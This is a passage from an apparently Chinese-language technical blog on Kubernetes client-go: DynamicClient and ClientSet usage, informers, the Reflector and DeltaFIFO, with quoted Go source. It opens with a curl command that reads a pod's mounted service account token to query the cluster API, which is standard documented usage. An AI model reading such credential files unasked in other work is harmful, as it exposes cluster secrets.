/var/run/secrets/kubernetes.io/serviceaccount/，通过这些就可以从Pod内部访问API\ncd /var/run/secrets/kubernetes.io/serviceaccount/\rcurl --cacert ca.crt --header \u0026quot;Authorization: Bearer $(cat token)\u0026quot; https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/default/pods/netbox\rReference\nKubernetes API Reference Docs\nclient-go 关于client-go的模块 k8s.io/api 与Pods、ConfigMaps、Secrets和其他Kubernetes 对象所对应的数据结构都在，k8s.io/api，此包几乎没有算法，仅仅是数据机构，该模块有多达上千个用于描述Kubernetes中资源API的结构；通常被client，server，controller等其他的组件使用。\nk8s.io/apimachinery 根据该库的描述文件可知，这个库是Server和Client中使用的Kubernetes API共享依赖库，也是kubernetes中更低一级的通用的数据结构。在我们构建自定义资源时，不需要为自定义结构创建属性，如 Kind, apiVersion，name\u0026hellip;，这些都是库 apimachinery 所提供的功能。\n如，在包 k8s.io/apimachinery/pkg/apis/meta 定义了两个结构 TypeMeta 和 ObjectMeta；将这这两个结构嵌入自定义的结构中，可以以通用的方式兼容对象，如Kubernetes中的资源 Deplyment 也是这么完成的\n通过图来了解Kubernetes的资源如何实现的\r如在 k8s.io/apimachinery/pkg/runtime/interfaces.go 中定义了 interface，这个类为在schema中注册的API都需要实现这个结构\ntype Object interface {\rGetObjectKind() schema.ObjectKind\rDeepCopyObject() Object\r}\r非结构化数据 非结构化数据 Unstructured 是指在kubernete中允许将没有注册为Kubernetes API的对象，作为Json对象的方式进行操作，如，使用非结构化 Kubernetes 对象\ndesired := \u0026amp;unstructured.Unstructured{\rObject: map[string]interface{}{\r\u0026quot;apiVersion\u0026quot;: \u0026quot;v1\u0026quot;,\r\u0026quot;kind\u0026quot;: \u0026quot;ConfigMap\u0026quot;,\r\u0026quot;metadata\u0026quot;: map[string]interface{}{\r\u0026quot;namespace\u0026quot;: namespace,\r\u0026quot;generateName\u0026quot;: \u0026quot;crud-dynamic-simple-\u0026quot;,\r},\r\u0026quot;data\u0026quot;: map[string]interface{}{\r\u0026quot;foo\u0026quot;: \u0026quot;bar\u0026quot;,\r},\r},\r}\r非结构化数据的转换 在 k8s.io/apimachinery/pkg/runtime.UnstructuredConverter 中，也提供了将非结构化数据转换为Kubernetes API注册过的结构，参考如何将非结构化对象转换为Kubernetes Object。\nReference\ngo types\ninstall client-go 如何选择 client-go 的版本\n​\t对于不同的kubernetes版本使用标签 v0.x.y 来表示对应的客户端版本。具体对应参考 client-go 。\n​\t例如使用的kubernetes版本为 v1.18.20 则使用对应的标签 v0.x.y 来替换符合当前版本的客户端库。例如：\ngo get k8s.io/client-go@v0.18.10\r官网中给出了client-go的兼容性矩阵，可以很明了的看出如何选择适用于自己kubernetes版本的对应的client-go\n✓ 表示 该版本的 client-go 与对应的 kubernetes版本功能完全一致 + client-go 具有 kubernetes apiserver中不具备的功能。 - Kubernetes apiserver 具有client-go 无法使用的功。 一般情况下，除了对应的版本号完全一致外，其他都存在 功能的+-。\nclient-go 目录介绍 client-go的每一个目录都是一个go package\nkubernetes 包含与Kubernetes API所通信的客户端集 discovery 用于发现kube-apiserver所支持的api dynamic 包含了一个动态客户端，该客户端能够对kube-apiserver任意的API进行操作。 transport 提供了用于设置认证和启动链接的功能 tools/cache: 一些 low-level controller与一些数据结构如fifo，reflector等 structure of client-go RestClient：是最基础的基础架构，其作用是将是使用了http包进行封装成RESTClient。位于rest 目录，RESTClient封装了资源URL的通用格式，例如Get()、Put()、Post() Delete()。是与Kubernetes API的访问行为提供的基于RESTful方法进行交互基础架构。\n同时支持Json 与 protobuf 支持所有的原生资源和CRD ClientSet：Clientset基于RestClient进行封装对 Resource 与 version 管理集合；如何创建\nDiscoverySet：RestClient进行封装，可动态发现 kube-apiserver 所支持的 GVR（Group Version Resource）；如何创建，这种类型是一种非映射至clientset的客户端\nDynamicClient：基于RestClient，包含动态的客户端，可以对Kubernetes所支持的 API对象进行操作，包括CRD；如何创建\n仅支持json\nfakeClient， client-go 实现的mock对象，主要用于单元测试。\n以上client-go所提供的客户端，仅可使用kubeconfig进行连接。\n什么是clientset clientset代表了kubernetes中所有的资源类型，这里不包含CRD的资源，如：\ncore extensions batch \u0026hellip; client-go使用 DynamicClient客户端\n与 ClientSet 的区别是，可以对任意 Kubernetes 资源进行 RESTful 操作。同样提供管理的方法\n最大的不同，ClientSet 需要预先实现每种 Resource 和 Version 的操作，内部的数据都是结构化数据（已知数据结构）；DynamicClient 内部实现了 Unstructured，用于处理非结构化的数据（无法提前预知的数据结构），这是其可以处理 CRD 自定义资源的关键。\ndynamicClient 实现流程\n通过 NewForConfig 实例化 conf 为 DynamicInterface客户端\nDynamicInterface 客户端中，实现了一个Resource 方法即为实现了Interface接口\ndynamicClient 实现了非结构化数据类型与rest client，可以通过其方法将Resource 由rest从apiserver中获得api对象，runtime.DeafultUnstructuredConverter.FromUnstructrued 转为对应的类型。\n注意：GVR 中资源类型 resource为复数。kind:Pod 即为 Pods\npackage main\rimport (\r\u0026quot;context\u0026quot;\r\u0026quot;flag\u0026quot;\r\u0026quot;fmt\u0026quot;\r\u0026quot;os\u0026quot;\rv1 \u0026quot;k8s.io/apimachinery/pkg/apis/meta/v1\u0026quot;\r\u0026quot;k8s.io/apimachinery/pkg/runtime/schema\u0026quot;\r\u0026quot;k8s.io/client-go/dynamic\u0026quot;\r\u0026quot;k8s.io/client-go/kubernetes\u0026quot;\r\u0026quot;k8s.io/client-go/rest\u0026quot;\r\u0026quot;k8s.io/client-go/tools/clientcmd\u0026quot;\r\u0026quot;k8s.io/client-go/util/homedir\u0026quot;\r)\rfunc main() {\rvar (\rk8sconfig *string //使用kubeconfig配置文件进行集群权限认证\rrestConfig *rest.Config\rerr error\r)\rif home := homedir.HomeDir(); home != \u0026quot;\u0026quot; {\rk8sconfig = flag.String(\u0026quot;kubeconfig\u0026quot;, fmt.Sprintf(\u0026quot;%s/.kube/config\u0026quot;, home), \u0026quot;kubernetes auth config\u0026quot;)\r}\rk8sconfig = k8sconfig\rflag.Parse()\rif _, err := os.Stat(*k8sconfig); err != nil {\rpanic(err)\r}\rif restConfig, err = rest.InClusterConfig(); err != nil {\r// 这里是从masterUrl 或者 kubeconfig传入集群的信息，两者选一\rrestConfig, err = clientcmd.BuildConfigFromFlags(\u0026quot;\u0026quot;, *k8sconfig)\rif err != nil {\rpanic(err)\r}\r}\r// 创建客户端类型\r// NewForConfig creates a new dynamic client or returns an error.\r// dynamic.NewForConfig(restConfig)\r// NewForConfig creates a new Clientset for the given config\r// kubernetes.NewForConfig(restConfig)\r// NewDiscoveryClientForConfig creates a new DiscoveryClient for the given config.\r//clientset, err := discovery.NewDiscoveryClientForConfig(restConfig)\rdynamicset, err := dynamic.NewForConfig(restConfig)\r// 这里遵循的是 kubernetes Rest API，如Pod是\r// /api/v1/namespaces/{namespace}/pods\r// /apis/apps/v1/namespaces/{namespace}/deployments\r// 遵循GVR格式填写\rpodList, err := dynamicset.Resource(schema.GroupVersionResource{\rGroup: \u0026quot;\u0026quot;,\rVersion: \u0026quot;v1\u0026quot;,\rResource: \u0026quot;pods\u0026quot;,\r}).Namespace(\u0026quot;default\u0026quot;).List(context.TODO(), v1.ListOptions{})\rif err != nil {\rpanic(err)\r}\rdaemonsetList, err := dynamicset.Resource(schema.GroupVersionResource{\rGroup: \u0026quot;apps\u0026quot;,\rVersion: \u0026quot;v1\u0026quot;,\rResource: \u0026quot;daemonsets\u0026quot;,\r}).Namespace(\u0026quot;kube-system\u0026quot;).List(context.TODO(), v1.ListOptions{})\rif err != nil {\rpanic(err)\r}\rfor _, row := range podList.Items {\rfmt.Println(row.GetName())\r}\rfor _, row := range daemonsetList.Items {\rfmt.Println(row.GetName())\r}\r// clientset mode\rclientset, err := kubernetes.NewForConfig(restConfig)\rpodIns, err := clientset.CoreV1().Pods(\u0026quot;default\u0026quot;).List(context.TODO(), v1.ListOptions{})\rfor _, row := range podIns.Items {\rfmt.Println(row.GetName())\r}\r}\rExtension\n一些client-go使用\nInformer informer是client-go提供的 Listwatcher 接口，主要作为 Controller构成的组件，在Kubernetes中， Controller的一个重要作用是观察对象的期望状态 spec 和实际状态 statue 。为了观察对象的状态，Controller需要向 Apiserver发送请求；但是通常情况下，频繁向Apiserver发出请求的会增加etcd的压力，为了解决这类问题，client-go 一个缓存，通过缓存，控制器可以不必发出大量请求，并且只关心对象的事件。也就是 informer。\n从本质上来讲，informer是使用kubernetes API观察其变化，来维护状态的缓存，称为 indexer；并通过对应事件函数通知客户端信息的变化，informer为一系列组件，通过这些组件来实现的这些功能。\nReflector：与 apiserver交互的组件 Delta FIFO：一个特殊的队列，Reflector将状态的变化存储在里面 indexer：本地存储，与etcd保持一致，减轻API Server与etcd的压力 Processor：监听处理器，通过将监听到的事件发送给对应的监听函数 Controller：从队列中对整个数据的编排处理的过程 informer的工作模式 首先通过List从Kubernetes API中获取资源所有对象并同时缓存，然后通过Watch机制监控资源。这样，通过informer与缓存，就可以直接和informer交互，而不用每次都和Kubernetes API交互。\n另外，informer 还提供了事件的处理机制，以便 Controller 或其他应用程序根据回调钩子函数等处理特定的业务逻辑。因为Informer可以通过List/Watch机制监控所有资源的所有事件，只要在Informer中添加ResourceEventHandler实例的回调函数，如：onadd(obj interface {}), onupdate (oldobj, newobj interface {})和OnDelete( obj interface {}) 可以实现处理资源的创建、更新和删除。 在Kubernetes中，各种控制器都使用了Informer。\n分析informer的流程 通过代码 k8s.io/client-go/informers/apps/v1/deployment.go 可以看出，在每个控制器下，都实现了一个 Informer 和 Lister ，Lister就是indexer；\ntype SharedInformer interface {\r// 添加一个事件处理函数，使用informer默认的resync period\rAddEventHandler(handler ResourceEventHandler)\r// 将事件处理函数注册到 share informer，将resyncPeriod作为参数传入\rAddEventHandlerWithResyncPeriod(handler ResourceEventHandler, resyncPeriod time.Duration)\r// 从本地缓存获取的信息作为infomer的返回\rGetStore() Store\r// 已弃用\rGetController() Controller\r// 运行一个informer，当stopCh停止时，informer也被关闭\rRun(stopCh \u0026lt;-chan struct{})\r// HasSynced returns true if the shared informer's store has been\r// informed by at least one full LIST of the authoritative state\r// of the informer's object collection. This is unrelated to \u0026quot;resync\u0026quot;.\rHasSynced() bool\r// LastSyncResourceVersion is the resource version observed when last synced with the underlying store. The value returned is not synchronized with access to the underlying store and is not thread-safe.\rLastSyncResourceVersion() string\r}\r而 Shared Informer 对所有的API组提供一个shared informer\n// SharedInformerFactory provides shared informers for resources in all known\r// API group versions.\rtype SharedInformerFactory interface {\rinternalinterfaces.SharedInformerFactory\rForResource(resource schema.GroupVersionResource) (GenericInformer, error)\rWaitForCacheSync(stopCh \u0026lt;-chan struct{}) map[reflect.Type]bool\rAdmissionregistration() admissionregistration.Interface\rApps() apps.Interface\rAuditregistration() auditregistration.Interface\rAutoscaling() autoscaling.Interface\rBatch() batch.Interface\rCertificates() certificates.Interface\rCoordination() coordination.Interface\rCore() core.Interface\rDiscovery() discovery.Interface\rEvents() events.Interface\rExtensions() extensions.Interface\rFlowcontrol() flowcontrol.Interface\rNetworking() networking.Interface\rNode() node.Interface\rPolicy() policy.Interface\rRbac() rbac.Interface\rScheduling() scheduling.Interface\rSettings() settings.Interface\rStorage() storage.Interface\r}\r可以看到在 k8s.io/client-go/informers/apps/v1/deployment.go 实现了这个interface\ntype DeploymentInformer interface {\rInformer() cache.SharedIndexInformer\rLister() v1.DeploymentLister\r}\r而在对应的 deployment controller中会调用这个Informer 实现对状态的监听；``\n// NewDeploymentController creates a new DeploymentController.\r// appsinformers.DeploymentInformer就是client-go 中的 /apps/v1/deployment实现的informer\rfunc NewDeploymentController(dInformer appsinformers.DeploymentInformer, rsInformer appsinformers.ReplicaSetInformer, podInformer coreinformers.PodInformer, client clientset.Interface) (*DeploymentController, error) {\reventBroadcaster := record.NewBroadcaster()\reventBroadcaster.StartLogging(klog.Infof)\reventBroadcaster.StartRecordingToSink(\u0026amp;v1core.EventSinkImpl{Interface: client.CoreV1().Events(\u0026quot;\u0026quot;)})\rif client != nil \u0026amp;\u0026amp; client.CoreV1().RESTClient().GetRateLimiter() != nil {\rif err := ratelimiter.RegisterMetricAndTrackRateLimiterUsage(\u0026quot;deployment_controller\u0026quot;, client.CoreV1().RESTClient().GetRateLimiter()); err != nil {\rreturn nil, err\r}\r}\rdc := \u0026amp;DeploymentController{\rclient: client,\reventRecorder: eventBroadcaster.NewRecorder(scheme.Scheme, v1.EventSource{Component: \u0026quot;deployment-controller\u0026quot;}),\rqueue: workqueue.NewNamedRateLimitingQueue(workqueue.DefaultControllerRateLimiter(), \u0026quot;deployment\u0026quot;),\r}\rdc.rsControl = controller.RealRSControl{\rKubeClient: client,\rRecorder: dc.eventRecorder,\r}\rdInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{\rAddFunc: dc.addDeployment,\rUpdateFunc: dc.updateDeployment,\r// This will enter the sync loop and no-op, because the deployment has been deleted from the store.\rDeleteFunc: dc.deleteDeployment,\r})\rrsInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{\rAddFunc: dc.addReplicaSet,\rUpdateFunc: dc.updateReplicaSet,\rDeleteFunc: dc.deleteReplicaSet,\r})\rpodInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{\rDeleteFunc: dc.deletePod,\r})\rdc.syncHandler = dc.syncDeployment\rdc.enqueueDeployment = dc.enqueue\rdc.dLister = dInformer.Lister()\rdc.rsLister = rsInformer.Lister()\rdc.podLister = podInformer.Lister()\rdc.dListerSynced = dInformer.Informer().HasSynced\rdc.rsListerSynced = rsInformer.Informer().HasSynced\rdc.podListerSynced = podInformer.Informer().HasSynced\rreturn dc, nil\r}\rReflector reflector是client-go中负责监听 Kubernetes API 的组件，也是整个机制中的生产者，负责将 watch到的数据将其放入 watchHandler 中的delta FIFO队列中。也就是吧etcd的数据反射为 delta fifo的数据\n在代码 k8s.io/client-go/tools/cache/reflector.go 中定义了 Reflector 对象\ntype Reflector struct {\r// reflector的名称，默认为一个 file:line的格式\rname string\r// 期待的类型名称，这里只做展示用，\r// 如果提供，是一个expectedGVK字符串类型，否则是expectedType字符串类型\rexpectedTypeName string\r// 期待放置在存储中的类型，如果是一个非格式化数据，那么其 APIVersion与Kind也必须为正确的格式\rexpectedType reflect.Type\r// GVK 存储中的对象，是GVK格式\rexpectedGVK *schema.GroupVersionKind\r// 同步数据的存储\rstore Store\r// 这个是reflector的一个核心，提供了 List和Watch功能\rlisterWatcher ListerWatcher\r// backoff manages backoff of ListWatch\rbackoffManager wait.BackoffManager\rresyncPeriod time.Duration\rShouldResync func() bool\r// clock allows tests to manipulate time\rclock clock.Clock\rpaginatedResult bool\r// 最后资源的版本号\rlastSyncResourceVersion string\r// 当 lastSyncResourceVersion 过期或者版本太大，这个值将为 true\risLastSyncResourceVersionUnavailable bool\r// 读写锁，对lastSyncResourceVersion的读写操作的保护\rlastSyncResourceVersionMutex sync.RWMutex\r// WatchListPageSize is the requested chunk size of initial and resync watch lists.\r// scalability problems.\r// 是初始化时，或者重新同步时的块大小。如果没有设置，将为任意的旧数据\r// 因为是提供了分页功能，RV=0则为默认的页面大小\r// WatchListPageSize int64\r}\r而 方法 NewReflector() 给用户提供了一个初始化 Reflector的接口\n在 cotroller.go 中会初始化一个 relector\nfunc (c *controller) Run(stopCh \u0026lt;-chan struct{}) {\rdefer utilruntime.HandleCrash()\rgo func() {\r\u0026lt;-stopCh\rc.config.Queue.Close()\r}()\rr := NewReflector(\rc.config.ListerWatcher,\rc.config.ObjectType,\rc.config.Queue,\rc.config.FullResyncPeriod,\r)\rReflector下有三个可对用户提供的方法，Run(), ListAndWatch() , LastSyncResourceVersion()\nRun() 是对Reflector的运行，也就是对 ListAndWatch() ；\nfunc (r *Reflector) Run(stopCh \u0026lt;-chan struct{}) {\rklog.V(2).Infof(\u0026quot;Starting reflector %s (%s) from %s\u0026quot;, r.expectedTypeName, r.resyncPeriod, r.name)\rwait.BackoffUntil(func() {\rif err := r.ListAndWatch(stopCh); err != nil {\rutilruntime.HandleError(err)\r}\r}, r.backoffManager, true, stopCh)\rklog.V(2).Infof(\u0026quot;Stopping reflector %s (%s) from %s\u0026quot;, r.expectedTypeName, r.resyncPeriod, r.name)\r}\r而 ListAndWatch() 则是实际上真实的对Reflector业务的执行\n// 前面一些都是对信息的初始化与日志输出\rfunc (r *Reflector) ListAndWatch(stopCh \u0026lt;-chan struct{}) error {\rklog.V(3).Infof(\u0026quot;Listing and watching %v from %s\u0026quot;, r.expectedTypeName, r.name)\rvar resourceVersion string\roptions := metav1.ListOptions{ResourceVersion: r.relistResourceVersion()}\r// 分页功能\rif err := func() error {\rinitTrace := trace.New(\u0026quot;Reflector ListAndWatch\u0026quot;, trace.Field{\u0026quot;name\u0026quot;, r.name})\rdefer initTrace.LogIfLong(10 * time.Second)\rvar list runtime.Object\rvar paginatedResult bool\rvar err error\rlistCh := make(chan struct{}, 1)\rpanicCh := make(chan interface{}, 1)\rgo func() {\r....\r// 清理和重新同步的一些\rresyncerrc := make(chan error, 1)\rcancelCh := make(chan struct{})\rdefer close(cancelCh)\rgo func() {\r...\r}()\rfor {\r// give the stopCh a chance to stop the loop, even in case of continue statements further down on errors\rselect {\rcase \u0026lt;-stopCh:\rreturn nil\rdefault:\r}\rtimeoutSeconds := int64(minWatchTimeout.Seconds() * (rand.Float64() + 1.0))\roptions = metav1.ListOptions{\rResourceVersion: resourceVersion,\r// 为了避免watch的挂起设置一个超时\r// 仅在工作窗口期，处理任何时间\rTimeoutSeconds: \u0026amp;timeoutSeconds,\r// To reduce load on kube-apiserver on watch restarts, you may enable watch bookmarks.\r// Reflector doesn't assume bookmarks are returned at all (if the server do not support\r// watch bookmarks, it will ignore this field).\rAllowWatchBookmarks: true,\r}\rstart := r.clock.Now()\r// 开始监听\rw, err := r.listerWatcher.Watch(options)\rif err != nil {\rswitch {\rcase isExpiredError(err):\r// 没有设置 LastSyncResourceVersionExpired 也就是过期，会保持与返回数据相同的\r// 首次会先将RV列出\rklog.V(4).Infof(\u0026quot;%s: watch of %v closed with: %v\u0026quot;, r.name, r.expectedTypeName, err)\rcase err == io.EOF:\r// 通常为watch关闭\rcase err == io.ErrUnexpectedEOF:\rklog.V(1).Infof(\u0026quot;%s: Watch for %v closed with unexpected EOF: %v\u0026quot;, r.name, r.expectedTypeName, err)\rdefault:\rutilruntime.HandleError(fmt.Errorf(\u0026quot;%s: Failed to watch %v: %v\u0026quot;, r.name, r.expectedTypeName, err))\r}\r// 如果出现 connection refuse，通常与apisserver通讯失败，这个时候会重新发送请求\rif utilnet.IsConnectionRefused(err) {\rtime.Sleep(time.Second)\rcontinue\r}\rreturn nil\r}\rif err := r.watchHandler(start, w, \u0026amp;resourceVersion, resyncerrc, stopCh); err != nil {\rif err != errorStopRequested {\rswitch {\rcase isExpiredError(err):\r// 同上步骤的功能\rklog.V(4).Infof(\u0026quot;%s: watch of %v closed with: %v\u0026quot;, r.name, r.expectedTypeName, err)\rdefault:\rklog.Warningf(\u0026quot;%s: watch of %v ended with: %v\u0026quot;, r.name, r.expectedTypeName, err)\r}\r}\rreturn nil\r}\r}\r}\r那么在实现时，如 deploymentinformer,会实现 Listfunc和 watchfunc，这其实就是clientset中的操作方法，也是就list与watch\nfunc NewFilteredDeploymentInformer(client kubernetes.Interface, namespace string, resyncPeriod time.Duration, indexers cache.Indexers, tweakListOptions internalinterfaces.TweakListOptionsFunc) cache.SharedIndexInformer {\rreturn cache.NewSharedIndexInformer(\r\u0026amp;cache.ListWatch{\rListFunc: func(options metav1.ListOptions) (runtime.Object, error) {\rif tweakListOptions != nil {\rtweakListOptions(\u0026amp;options)\r}\rreturn client.AppsV1().Deployments(namespace).List(context.TODO(), options)\r},\rWatchFunc: func(options metav1.ListOptions) (watch.Interface, error) {\rif tweakListOptions != nil {\rtweakListOptions(\u0026amp;options)\r}\rreturn client.AppsV1().Deployments(namespace).Watch(context.TODO(), options)\r},\r},\r\u0026amp;appsv1.Deployment{},\rresyncPeriod,\rindexers,\r)\r}\rtools/cache/controller.go 是存储controller的配置及实现。\ntype Config struct {\rQueue // 对象的队列，必须为DeltaFIFO\rListerWatcher // 这里能够监视并列出对象的一些信息，这个对象接受process函数的弹出\r// Something that can process a popped Deltas.\rProcess ProcessFunc // 处理Delta的弹出\r// 对象类型，这个controller期待的处理类型，其apiServer与kind必须正确，即，GVR必须正确\rObjectType runtime.Object\r// FullResyncPeriod是每次重新同步的时间间隔\rFullResyncPeriod time.Duration\r// type ShouldResyncFunc func() bool\r// 返回值nil或true，则表示reflector继续同步\rShouldResync ShouldResyncFunc\rRetryOnError bool // 标志位，true时，在process()返回错误时重新排列对象\r// Called whenever the ListAndWatch drops the connection with an error.\r// 断开连接是出现错误调用这个函数处理\rWatchErrorHandler WatchErrorHandler\r// WatchListPageSize is the requested chunk size of initial and relist watch lists.\rWatchListPageSize int64\r}\r实现这个接口\ntype controller struct {\rconfig Config\rreflector *Reflector\rreflectorMutex sync.RWMutex\rclock clock.Clock\r}\rNew() 为给定controller 配置的设置，即为上面的config struct，用来初始化controller对象\nNewInformer() ：返回一个store（保存数据的最终接口）和一个用于store的controller，同时提供事件的通知(crud)等\nNewIndexerInformer()：返回一个索引与一个用于索引填充的控制器\n控制器的run()的功能实现\nfunc (c *controller) Run(stopCh \u0026lt;-chan struct{}) {\rdefer utilruntime.HandleCrash() // 延迟销毁\rgo func() { // 信号处理，用于线程管理\r\u0026lt;-stopCh\rc.config.Queue.Close()\r}() r := NewReflector( // 初始化Reflector\rc.config.ListerWatcher, // ls\rc.config.ObjectType,\rc.config.Queue,\rc.config.FullResyncPeriod,\r)\rr.ShouldResync = c.config.ShouldResync // 配置是否应该继续同步\rr.WatchListPageSize = c.config.WatchListPageSize\rr.clock = c.clock\rif c.config.WatchErrorHandler != nil { // 断开连接错误处理\rr.watchErrorHandler = c.config.WatchErrorHandler\r}\rc.reflectorMutex.Lock()\rc.reflector = r\rc.reflectorMutex.Unlock()\rvar wg wait.Group\rwg.StartWithChannel(stopCh, r.Run) // 这里是真正的运行。\r// processLoop() 是DeltaFIFO的消费者方法\rwait.Until(c.processLoop, time.Second, stopCh) // 消费队列的数据\rwg.Wait()\r}\r总结 在controller的初始化时就初始化了Reflector， controller.Run里面Reflector是结构体初始化时的Reflector，主要作用是watch指定的资源，并且将变化同步到本地的store中。\nReflector接着执行ListAndWatch函数，ListAndWatch第一次会列出所有的对象，并获取资源对象的版本号，然后watch资源对象的版本号来查看是否有被变更。首先会将资源版本号设置为0，list()可能会导致本地的缓存相对于etcd里面的内容存在延迟，Reflector会通过watch的方法将延迟的部分补充上，使得本地缓存数据与etcd的数据保持一致。\ncontroller.Run函数还会调用processLoop函数，processLoop通过调用HandleDeltas，再调用distribute，processorListener.add最终将不同更新类型的对象加入processorListener的channel中，供processorListener.Run使用。\nDelta FIFO 通过下图可以看出，Delta FIFO 是位于Reflector中的一个FIFO队列，那么 Delta FIFO 究竟是什么，让我们来进一步深剖。\n图源于：https://miro.medium.com/max/700/1*iI8uFsPRBY5m_g_WW4huMQ.png\r在代码中的注释可以看到一些信息，根据信息可以总结出\nDelta FIFO 是一个生产者-消费者的队列，生产者是 Reflector，消费者是 Pop() 与传统的FIFO有两点不同 Delta FIFO Delta FIFO也是实现了 Queue以及一些其他 interface 的类，\ntype DeltaFIFO struct {\rlock sync.RWMutex // 一个读写锁，保证线程安全\rcond sync.Cond\ritems map[string]Deltas // 存放的类型是一个key[string] =》 value[Delta] 类型的数据\rqueue []string // 用于存储item的key，是一个fifo\rpopulated bool // populated 是用来标记首次被加入的数据是否被变动\rinitialPopulationCount int // 首次调用 replace() 的数量\rkeyFunc KeyFunc\rknownObjects KeyListerGetter // 这里为indexer\rclosed bool // 代表已关闭\rclosedLock sync.Mutex\remitDeltaTypeReplaced bool // 表示事件的类型，true为 replace(), false 为 sync()\r}\r那么delta的类型是，也就是说通常情况下，Delta为一个 string[runtime.object] 的对象\ntype Delta struct {\rType DeltaType // 这就是一个string\rObject interface{} // 之前API部分有了解到，API的类型大致为两类，runtime.Object和非结构化数据\r}\rapimachinery/pkg/runtime/interfaces.go\n那么此时，已经明白了Delta FIFO的结构，为一个Delta的队列，整个结构如下\n第一步创建一个Delta FIFO 现在版本中，对创建Delta FIFO是通过函数 NewDeltaFIFOWithOptions()\nfunc NewDeltaFIFOWithOptions(opts DeltaFIFOOptions) *DeltaFIFO {\rif opts.KeyFunction == nil {\ropts.KeyFunction = MetaNamespaceKeyFunc // 默认的计算key的方法\r}\rf := \u0026amp;DeltaFIFO{\ritems: map[string]Deltas{},\rqueue: []string{},\rkeyFunc: opts.KeyFunction,\rknownObjects: opts.KnownObjects,\remitDeltaTypeReplaced: opts.EmitDeltaTypeReplaced,\r}\rf.cond.L = \u0026amp;f.lock\rreturn f\r}\rqueueActionLocked，Delta FIFO添加操作 这里说下之前说道的，在追加时的操作 queueActionLocked ，如add update delete实际上走的都是这里\nfunc (f *DeltaFIFO) queueActionLocked(actionType DeltaType, obj interface{}) error {\rid, err := f.KeyOf(obj) // 计算key\rif err != nil {\rreturn KeyError{obj, err}\r}\r// 把新数据添加到DeltaFIFO中，Detal就是 动作为key，对象为值\r// item是DeltaFIFO中维护的一个 map[string]Deltas\rnewDeltas := append(f.items[id], Delta{actionType, obj})\rnewDeltas = dedupDeltas(newDeltas) // 去重，去重我们前面讨论过了\rif len(newDeltas) \u0026gt; 0 {\rif _, exists := f.items[id]; !exists {\rf.queue = append(f.queue, id)\r} // 不存在则添加\rf.items[id] = newDeltas\rf.cond.Broadcast()\r} else {\rdelete(f.items, id) // 这里走不到，因为添加更新等操作用newDelta是1\r// 源码中也说要忽略这里\r}\rreturn nil\r}\r在FIFO继承的Stroe的方法中，如，Add, Update等都是需要去重的，去重的操作是通过对比最后一个和倒数第二个值\nfunc (f *DeltaFIFO) queueActionLocked(actionType DeltaType, obj interface{}) error {\rid, err := f.KeyOf(obj)\rif err != nil {\rreturn KeyError{obj, err}\r}\rnewDeltas := append(f.items[id], Delta{actionType, obj})\rnewDeltas = dedupDeltas(newDeltas)\r...\r在函数 dedupDeltas() 中实现的这个\n// re-listing and watching can deliver the same update multiple times in any\rorder. This will combine the most recent two deltas if they are the same.\rfunc dedupDeltas(deltas Deltas) Deltas {\rn := len(deltas)\rif n \u0026lt; 2 {\rreturn deltas\r}\ra := \u0026amp;deltas[n-1] // 如 [1,2,3,4] a=4\rb := \u0026amp;deltas[n-2] // b=3,这里两个值其实为事件\rif out := isDup(a, b); out != nil {\rd := append(Deltas{}, deltas[:n-2]...)\rreturn append(d, *out)\r}\rreturn deltas\r}\r如果b对象的类型是 DeletedFinalStateUnknown 也会认为是一个旧对象被删除，这里在去重时也只是对删除的操作进行去重。\n// tools/cache/delta_fifo.go\rfunc isDup(a, b *Delta) *Delta {\rif out := isDeletionDup(a, b); out != nil {\rreturn out\r}\r// TODO: Detect other duplicate situations? Are there any?\rreturn nil\r}\r// keep the one with the most information if both are deletions.\rfunc isDeletionDup(a, b *Delta) *Delta {\rif b.Type != Deleted || a.Type != Deleted {\rreturn nil\r}\r// Do more sophisticated checks, or is this sufficient?\rif _, ok := b.Object.(DeletedFinalStateUnknown); ok {\rreturn a\r}\rreturn b\r}\r为什么需要去重？什么情况下需合并\n代码中开发者给我们留了一个TODO\nTODO: is there anything other than deletions that need deduping?\n取决于Detal FIFO 生产-消费延迟 当在一个资源的创建时，其状态会频繁的更新，如 Creating，Runinng等，这个时候会出现大量写入FIFO中的数据，但是在消费端可能之前的并未消费完。 在上面那种情况下，以及Kubernetes 声明式 API 的设计，其实多余的根本不关注，只需要最后一个动作如Running，这种情况下，多个内容可以合并为一个步骤 然而在代码中，去重仅仅是在Delete状态生效，显然这不可用；那么结合这些得到： 在一个工作时间窗口内，如果对于删除操作来说发生多次，与发生一次实际上没什么区别，可以去重 但在更新于新增操作时，实际上在对于声明式 API 的设计个人感觉是完全可以做到去重操作。 同一个时间窗口内多次操作，如更新，实际上Kubernetes应该只关注最终状态而不是命令式？ Compute Key 上面大概对一些Detal FIFO的逻辑进行了分析，那么对于Detal FIFO如何去计算，也就是说 MetaNamespaceKeyFunc ，这个是默认的KeyFunc，作用是计算Detals中的唯一key。\nfunc MetaNamespaceKeyFunc(obj interface{}) (string, error) {\rif key, ok := obj.(ExplicitKey); ok { // 显示声明的则为这个值\rreturn string(key), nil\r}\rmeta, err := meta.Accessor(obj) // 那么使用Accessor,每一个资源都会实现这个Accessor\rif err != nil {\rreturn \u0026quot;\u0026quot;, fmt.Errorf(\u0026quot;object has no meta: %v\u0026quot;, err)\r}\rif len(meta.GetNamespace()) \u0026gt; 0 {\rreturn meta.GetNamespace() + \u0026quot;/\u0026quot; + meta.GetName(), nil\r}\rreturn meta.GetName(), nil\r}\rObjectMetaAccessor 每个Kubernetes资源都会实现这个对象，如Deployment\n// accessor interface\rtype ObjectMetaAccessor interface {\rGetObjectMeta() Object\r}\r// 会被ObjectMeta所实现\rfunc (obj *ObjectMeta) GetObjectMeta() Object { return obj }\r// 而每一个资源都会继承这个 ObjectMeta，如 ClusterRole\rtype ClusterRole struct {\rmetav1.TypeMeta `json:\u0026quot;,inline\u0026quot;`\rmetav1.ObjectMeta `json:\u0026quot;metadata,omitempty\u0026quot;protobuf:\u0026quot;bytes,1,opt,name=metadata\u0026quot;`\r那么这个Deltas的key则为集群类型的是资源本身的名字，namespace范围的则为 meta.GetNamespace() + \u0026quot;/\u0026quot; + meta.GetName()，可以在上面代码中看到，这样就可以给Detal生成了一个唯一的key\nkeyof，用于计算对象的key func (f *DeltaFIFO) KeyOf(obj interface{}) (string, error) {\rif d, ok := obj.(Deltas); ok {\rif len(d) == 0 { // 